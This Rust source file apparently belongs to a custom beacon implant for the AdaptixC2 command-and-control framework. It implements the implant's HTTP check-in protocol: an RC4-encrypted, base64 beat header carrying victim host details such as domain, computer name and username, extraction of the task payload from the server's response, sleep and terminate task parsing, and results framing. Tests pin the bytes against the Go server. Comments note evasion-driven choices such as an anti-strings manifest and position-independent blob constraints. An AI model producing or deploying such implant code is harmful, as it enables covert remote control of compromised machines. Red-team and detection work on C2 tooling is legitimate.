//! HTTP transport shaping for the AdaptixC2 `BeaconHTTP` listener (v1.2,
//! docs/WIRE.md): the pure halves of the transaction — the RC4+base64 beat
//! envelope of the request header, the page-template payload extraction and
//! task-pack parsing of the response, and the framed task-result body.
//!
//! Pinned against the server source (`beacon_listener_http/pl_transport.go`,
//! `beacon_agent/pl_main.go`/`pl_packer.go`, tag v1.2) by tests replaying
//! vectors produced by the exact Go semantics (crypto/rc4, base64, PackArray,
//! PackTasks). The WinHTTP glue that carries these bytes lives in the beacon
//! crate (`runtime::winhttp`); everything here is pure and bounded.

use crate::beat::BeatData;
use crate::rc4::Rc4;
use crate::wire::{Reader, Writer};

/// Standard base64 alphabet (Go `base64.StdEncoding`), with padding.
/// A runtime literal declared in the anti-strings manifest.
const B64: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// Base64 (std, padded) encode into `dst`; `None` if it does not fit.
pub fn base64_encode(src: &[u8], dst: &mut [u8]) -> Option<usize> {
    let need = src.len().div_ceil(3) * 4;
    if dst.len() < need {
        return None;
    }
    let mut si = 0usize;
    let mut di = 0usize;
    while si + 3 <= src.len() {
        let n = ((src[si] as u32) << 16) | ((src[si + 1] as u32) << 8) | src[si + 2] as u32;
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = B64[(n >> 6) as usize & 63];
        dst[di + 3] = B64[n as usize & 63];
        si += 3;
        di += 4;
    }
    let rem = src.len() - si;
    if rem == 1 {
        let n = (src[si] as u32) << 16;
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = b'=';
        dst[di + 3] = b'=';
        di += 4;
    } else if rem == 2 {
        let n = ((src[si] as u32) << 16) | ((src[si + 1] as u32) << 8);
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = B64[(n >> 6) as usize & 63];
        dst[di + 3] = b'=';
        di += 4;
    }
    Some(di)
}

/// Build the beat header value (listener `hb_header`):
/// `base64( RC4(listener_key, u32 BE watermark || u32 BE agent_id || beat) )`.
///
/// `scratch` holds the plaintext envelope during the call (must fit
/// `8 + beat size`); returns the encoded length in `out`.
pub fn beat_header(
    beat: &BeatData,
    listener_key: &[u8],
    watermark: u32,
    agent_id: u32,
    scratch: &mut [u8],
    out: &mut [u8],
) -> Option<usize> {
    let mut w = Writer::new(scratch);
    if !w.u32(watermark) || !w.u32(agent_id) || !crate::beat::write_beat(&mut w, beat) {
        return None;
    }
    let len = w.written();
    Rc4::new(listener_key).crypt_in_place(&mut scratch[..len]);
    base64_encode(&scratch[..len], out)
}

/// Byte range of the encrypted payload inside a response page (see
/// `extract_payload`); the range form lets the caller decrypt in place.
pub fn extract_payload_range(page: &[u8], prepend: &[u8], append: &[u8]) -> Option<(usize, usize)> {
    if !page.starts_with(prepend)
        || !page.ends_with(append)
        || page.len() < prepend.len() + append.len()
    {
        return None;
    }
    Some((prepend.len(), page.len() - append.len()))
}

/// Extract the encrypted task payload from a response page: the listener
/// substitutes `<<<PAYLOAD_DATA>>>` inside its `page-payload` template, so
/// the page is exactly `prepend || payload || append`. Empty payload = no
/// tasks hosted.
pub fn extract_payload<'a>(page: &'a [u8], prepend: &[u8], append: &[u8]) -> Option<&'a [u8]> {
    let (start, end) = extract_payload_range(page, prepend, append)?;
    Some(&page[start..end])
}

/// Server task pack command ids (native `beacon_agent`, pl_utils.go).
pub const COMMAND_TERMINATE: u32 = 10;
pub const COMMAND_PROFILE: u32 = 21;

/// A parsed server task (the commands the beacon can delimit and execute;
/// anything else in the pack stops the parse — the server keeps unprocessed
/// tasks hosted and resends them).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Task {
    /// `COMMAND_PROFILE` subop 1: sleep seconds + jitter percent.
    Sleep { sec: u32, jitter_pct: u32 },
    /// `COMMAND_TERMINATE`: silent exit.
    Terminate,
}

/// Parse one task record `[u32 LE commandId || args || u32 LE taskId]`.
/// `None` = unknown command or truncated record.
pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
    let command = r.u32_le()?;
    let task = match command {
        COMMAND_PROFILE => {
            // Same PackArray layout the server's CreateCommand emits for
            // "sleep": {COMMAND_PROFILE, 1, sleepTime, jitterTime}.
            let subop = r.u32_le()?;
            if subop != 1 {
                return None;
            }
            let sec = r.u32_le()?;
            let jitter_pct = r.u32_le()?;
            Task::Sleep { sec, jitter_pct }
        }
        COMMAND_TERMINATE => Task::Terminate,
        _ => return None,
    };
    let id = r.u32_le()?;
    Some((task, id))
}

/// Begin a results pack: reserve the `u32 BE size` the server's ProcessData
/// checks (`size - 4 == remaining`).
pub fn begin_results(w: &mut Writer) -> bool {
    w.u32(0)
}

/// Backfill the reserved size (`4 + body`).
pub fn finish_results(w: &mut Writer) -> bool {
    if w.written() < 4 {
        return false;
    }
    let total = w.written() as u32;
    w.backfill_u32_be(0, total);
    true
}

/// Append the sleep-acknowledgement record the server's ProcessData expects
/// for COMMAND_PROFILE: `u32 BE taskId || u32 BE 21 || u32 BE 1 || sec || jitter`.
pub fn push_sleep_result(w: &mut Writer, task_id: u32, sec: u32, jitter_pct: u32) -> bool {
    w.u32(task_id) && w.u32(COMMAND_PROFILE) && w.u32(1) && w.u32(sec) && w.u32(jitter_pct)
}

/// Wrap the packed results in the server's body frame
/// (`flags:0 || u32 LE origLen || data` — `decompressZlibData` passes the
/// payload through uncompressed when the flag is clear). `out` must fit
/// `5 + packed.len()`; the caller RC4-encrypts `out` with the session key.
pub fn wrap_results_frame(packed: &[u8], out: &mut [u8]) -> Option<usize> {
    if out.len() < 5 + packed.len() {
        return None;
    }
    out[0] = 0;
    // Manual copies (copy_from_slice lowers to memcpy — the
    // compiler_builtins rule: no reference may leave the blob code).
    let len = packed.len() as u32;
    let le = len.to_le_bytes();
    let mut i = 0;
    while i < 4 {
        out[1 + i] = le[i];
        i += 1;
    }
    let mut i = 0;
    while i < packed.len() {
        out[5 + i] = packed[i];
        i += 1;
    }
    Some(5 + packed.len())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::beat::BeatData;
    use std::vec::Vec;

    fn test_beat<'a>() -> BeatData<'a> {
        BeatData {
            sleep_sec: 60,
            jitter_pct: 10,
            killdate: 1_767_225_600,
            workingtime: 0,
            acp: 1252,
            oemcp: 437,
            gmt_offset: 2,
            pid: 0x1234,
            tid: 0x5678,
            build_number: 26100,
            major: 10,
            minor: 0,
            internal_ip: 0x0A00_020F,
            flags: 0b11,
            session_key: &[0x42u8; 32],
            domain: b"MEGACORP",
            computer: b"WIN-TEST",
            username: b"nariod",
            process: b"testhost.exe",
        }
    }

    fn hex(s: &str) -> Vec<u8> {
        (0..s.len() / 2)
            .map(|i| u8::from_str_radix(&s[2 * i..2 * i + 2], 16).unwrap())
            .collect()
    }

    /// RFC 4648 vectors (exactly Go's base64.StdEncoding, padding included).
    #[test]
    fn base64_rfc4648() {
        for (plain, enc) in [
            ("", ""),
            ("f", "Zg=="),
            ("fo", "Zm8="),
            ("foo", "Zm9v"),
            ("foob", "Zm9vYg=="),
            ("fooba", "Zm9vYmE="),
            ("foobar", "Zm9vYmFy"),
        ] {
            let mut out = [0u8; 16];
            let n = base64_encode(plain.as_bytes(), &mut out).unwrap();
            assert_eq!(&out[..n], enc.as_bytes(), "plain={plain:?}");
        }
    }

    #[test]
    fn base64_rejects_small_buffer() {
        let mut out = [0u8; 3];
        assert!(base64_encode(b"foobar", &mut out).is_none());
    }

    /// Full beat envelope, byte-pinned against the Go reference generator
    /// (crypto/rc4 + base64.StdEncoding, listener framing wm||id||beat).
    #[test]
    fn beat_header_matches_go_reference() {
        const GO_B64: &str = "sqA+2JlPpyMG25f6Dt0qRbokOF/yt0Lui3qkbPsl11QjOkt6xAniEoFVMtiyTflKxdcRzHdzsIul3kXhS4VpJME3ITl2pKpY/PBDAJmojku8ckBnBn+VpBpu6yAfzyDjRo+pEJ/JYks11us8fFcvG3BFl0UX1KVvqlxGDyhZ87xlng==";
        let mut scratch = [0u8; 512];
        let mut out = [0u8; 720];
        let n = beat_header(
            &test_beat(),
            &[0u8, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15],
            0x5b3c_7e21,
            0xdead_beef,
            &mut scratch,
            &mut out,
        )
        .unwrap();
        assert_eq!(&out[..n], GO_B64.as_bytes());
    }

    #[test]
    fn beat_header_rejects_small_scratch() {
        let mut scratch = [0u8; 16];
        let mut out = [0u8; 720];
        assert!(beat_header(&test_beat(), &[1u8; 16], 1, 2, &mut scratch, &mut out).is_none());
    }

    /// Response page: extract, session-decrypt, parse the task pack — the
    /// exact bytes the Go generator built through PackTasks.
    #[test]
    fn task_pack_from_go_reference() {
        const PREPEND: &[u8] = b"{\"result\":\"";
        const APPEND: &[u8] = b"\"}";
        let page =
            hex("7b22726573756c74223a22017f56c8611e546fb87839e4a822504871342c64a66f29cb227d");

        let payload = extract_payload(&page, PREPEND, APPEND).unwrap();
        let mut decrypted = payload.to_vec();
        Rc4::new(&[0x42u8; 32]).crypt_in_place(&mut decrypted);

        // PackTasks trailer: u32 LE total size, then [data || u32 LE taskId].
        let mut r = Reader::new(&decrypted);
        let total = r.u32_le().unwrap() as usize;
        assert_eq!(total, 20, "pack = 16 bytes data + 4 bytes taskId");
        assert!(total <= r.remaining());

        let (task, id) = parse_task(&mut r).unwrap();
        assert_eq!(
            task,
            Task::Sleep {
                sec: 60,
                jitter_pct: 10
            }
        );
        assert_eq!(id, 0x1122_3344);
        assert_eq!(r.remaining(), decrypted.len() - 4 - total);
    }

    #[test]
    fn empty_payload_is_no_tasks() {
        let page = b"{\"result\":\"\"}";
        let payload = extract_payload(page, b"{\"result\":\"", b"\"}").unwrap();
        assert!(payload.is_empty());
    }

    #[test]
    fn payload_extraction_rejects_foreign_pages() {
        assert!(extract_payload(b"other page", b"{\"result\":\"", b"\"}").is_none());
        assert!(extract_payload(b"{\"result\":\"", b"{\"result\":\"", b"\"}").is_none());
    }

    #[test]
    fn parse_task_terminate() {
        // COMMAND_TERMINATE (10), no args, taskId 1.
        let bytes = [10u8, 0, 0, 0, 1, 0, 0, 0];
        let mut r = Reader::new(&bytes);
        assert_eq!(parse_task(&mut r), Some((Task::Terminate, 1)));
        assert_eq!(r.remaining(), 0);
    }

    #[test]
    fn parse_task_rejects_unknown_command() {
        let bytes = [99u8, 0, 0, 0, 1, 0, 0, 0];
        let mut r = Reader::new(&bytes);
        assert!(parse_task(&mut r).is_none());
    }

    /// Results body, byte-pinned against the Go generator: the framed pack
    /// (u32 BE size || record) inside the 5-byte listener frame, before RC4.
    #[test]
    fn results_body_matches_go_reference() {
        const GO_FRAME_HEX: &str = "0018000000000000181122334400000015000000010000003c0000000a";
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(begin_results(&mut w));
        assert!(push_sleep_result(&mut w, 0x1122_3344, 60, 10));
        assert!(finish_results(&mut w));
        let packed = w.written_bytes().to_vec();

        let mut framed = [0u8; 64];
        let n = wrap_results_frame(&packed, &mut framed).unwrap();
        assert_eq!(&framed[..n], &hex(GO_FRAME_HEX)[..]);
    }

    /// End-to-end symmetry with the Go server: our results body decrypts to
    /// what the generator's frame decrypts to.
    #[test]
    fn results_frame_round_trips_go_reference() {
        const GO_RESULTS_HEX: &str = "156756c8741e546fa1691bd7d02250486e342c64e35c0bda5ad57c8882";
        let go_body = hex(GO_RESULTS_HEX);
        let mut decrypted = go_body.clone();
        Rc4::new(&[0x42u8; 32]).crypt_in_place(&mut decrypted);

        // Server frame: flags 0, u32 LE origLen.
        assert_eq!(decrypted[0], 0);
        let orig_len =
            u32::from_le_bytes([decrypted[1], decrypted[2], decrypted[3], decrypted[4]]) as usize;
        assert_eq!(orig_len, decrypted.len() - 5);
        let mut r = Reader::new(&decrypted[5..]);
        let size = r.u32().unwrap();
        assert_eq!(size as usize, 4 + 20);
        let task_id = r.u32().unwrap();
        let command = r.u32().unwrap();
        let subop = r.u32().unwrap();
        let sec = r.u32().unwrap();
        let jitter = r.u32().unwrap();
        assert_eq!(task_id, 0x1122_3344);
        assert_eq!(command, COMMAND_PROFILE);
        assert_eq!(subop, 1);
        assert_eq!(sec, 60);
        assert_eq!(jitter, 10);
        assert_eq!(r.remaining(), 0);
    }
}
